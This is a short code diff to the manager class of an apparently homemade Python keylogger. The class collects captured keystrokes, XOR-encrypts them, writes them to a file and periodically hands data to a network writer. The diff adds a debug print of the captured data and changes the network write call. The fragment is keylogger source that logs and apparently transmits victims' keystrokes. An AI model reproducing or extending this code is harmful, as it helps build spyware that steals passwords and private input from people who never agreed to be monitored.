@@ -1,5 +1,4 @@
 from time import sleep
-
 from keyLogger import *
 from writer import *
 from encryptor import *
@@ -43,9 +42,10 @@ class Manager:
                     dict_encrypt = XorEncryptor().encrypt(get_dict)
                     # print(dict_encrypt)
                     # Write the encrypted dictionary to the file
+                    print(str(get_dict))
                     fw.write(dict_encrypt)
                 if count >= reset:
-                    nw.write()
+                    nw.write("aaa")
                     count = 0
 
 
